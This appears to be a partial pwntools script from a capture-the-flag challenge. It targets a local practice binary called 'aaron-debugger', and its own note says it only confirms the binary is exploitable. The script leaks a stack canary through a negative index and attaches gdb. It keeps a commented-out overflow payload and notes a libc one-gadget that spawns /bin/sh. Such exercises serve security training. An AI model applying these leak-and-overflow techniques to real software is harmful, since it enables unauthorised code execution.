#!/usr/bin/env python3


'''



NOTE:


we're too lazy to write a solve script for this one so this script just confirms it's exploitable. Ping us if you have questions about how to exploit it.






'''

# 0000000000021b10 g    DF .text	00000000000001be  GLIBC_2.2.5 __libc_start_main

# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL


from pwn import *
import sys

context.log_level = 'debug'
#context.log_level = 'error'
p = process('../bin/aaron-debugger')

#input()

p.sendlineafter(b'> ', b'-29')

p.recvuntil(b'message pointer: ')

canary = p.recvline()[:-1];

print("canary", str(canary))

gdb.attach(p)
# p.sendline(b'A'*200 + p64(int(canary, 16)) + b'A'*200)



p.interactive()
